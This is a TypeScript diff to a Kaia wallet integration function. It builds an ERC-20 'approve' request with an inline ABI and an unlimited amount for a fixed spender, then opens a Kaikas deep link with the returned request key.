@@ -21,8 +21,18 @@ export const kaiaWalletApprove = async (): Promise<void> => {
                     }
                 },
                 'transaction': {
-                    'abi': abi,
-                    'address': '0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2',
+                    'abi': "{\n" +
+                        "    \"constant\": false,\n" +
+                        "    \"inputs\": [\n" +
+                        "      { \"name\": \"spender\", \"type\": \"address\" },\n" +
+                        "      { \"name\": \"amount\", \"type\": \"uint256\" }\n" +
+                        "    ],\n" +
+                        "    \"name\": \"approve\",\n" +
+                        "    \"outputs\": [{ \"name\": \"\", \"type\": \"bool\" }],\n" +
+                        "    \"type\": \"function\"\n" +
+                        "  }",
+                    "value": "0",
+                    'to': '0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2',
                     'params': '["0x48F943a8a6A6437117063D3aCaf62e2047467966", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]'
                 }
             },
@@ -32,7 +42,9 @@ export const kaiaWalletApprove = async (): Promise<void> => {
                 }
             }
         );
-        return res.data
+
+        window.open(`kaikas://wallet/api?request_key=${res.data.request_key}`);
+
     } catch (error) {
         console.error(" 交易失败:", error);
         throw error; // 抛出错误
